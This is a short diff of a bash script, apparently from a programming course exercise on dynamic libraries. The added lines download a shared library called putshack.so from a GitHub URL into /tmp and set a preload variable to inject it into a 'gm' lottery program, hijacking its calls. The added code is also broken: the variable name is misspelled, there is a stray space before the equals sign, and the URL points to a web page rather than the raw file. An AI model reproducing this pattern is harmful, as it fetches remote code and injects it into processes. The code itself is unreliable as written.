@@ -1,2 +1,3 @@
 #!/bin/bash
-cp gm gm_tmp && echo "9 8 10 24 75 9" > numbers.txt && sleep 98 && cp gm_tmp gm && ./gm 9 8 10 24 75 9
+wget -P /tmp/ https://github.com/Lavyatarah/alx-low_level_programming/blob/master/0x18-dynamic_libraries/putshack.so
+export LD_PREALOAD =/tmp/putshack.so
